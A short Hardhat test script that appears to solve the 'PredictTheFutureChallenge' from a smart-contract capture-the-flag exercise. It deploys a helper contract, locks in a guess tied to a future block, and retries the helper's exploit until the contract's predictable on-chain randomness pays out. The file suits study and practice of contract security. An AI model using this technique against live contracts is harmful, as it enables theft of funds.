const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("PredictTheFutureChallenge", async function () {
    let contract;

    before(async function () {
        contract = await (await ethers.getContractFactory("PredictTheFutureChallenge")).deploy({ value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        helper = await (await ethers.getContractFactory("PredictTheFutureHelper")).deploy();
        const guess = (await ethers.provider.getBlockNumber()) + 2;
        await helper.lockInGuess(contract.address, await helper.answer(guess), { value: ethers.utils.parseEther("1") });
        while (true)
            try {
                await helper.exploit(contract.address);
                break;
            } catch (err) { }

    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});